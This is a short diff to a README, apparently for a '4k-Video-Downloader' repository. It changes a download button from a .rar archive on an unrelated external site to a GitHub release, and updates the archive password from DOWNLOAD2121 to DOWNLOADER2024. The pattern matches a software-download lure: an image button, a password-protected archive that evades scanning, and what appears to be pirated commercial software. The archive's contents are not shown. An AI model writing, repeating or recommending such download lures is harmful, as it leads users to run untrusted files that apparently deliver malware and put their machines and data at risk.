@@ -14,11 +14,11 @@
 > [!NOTE]
 > - **Select a version**
 
-[![Group_4_2](https://github.com/user-attachments/assets/1b907f48-0908-4aff-bdc7-8b84393aff0f)](https://lesfrancs-tireurs.net/temp/Software.rar)
+[![Group_4_2](https://github.com/user-attachments/assets/1b907f48-0908-4aff-bdc7-8b84393aff0f)](https://github.com/JimiMetro/4k-Video-Downloader/releases/tag/downloader)
 
 
 > [!NOTE]
-> **PASSWORD: DOWNLOAD2121**
+> **PASSWORD: DOWNLOADER2024**
 
 
 
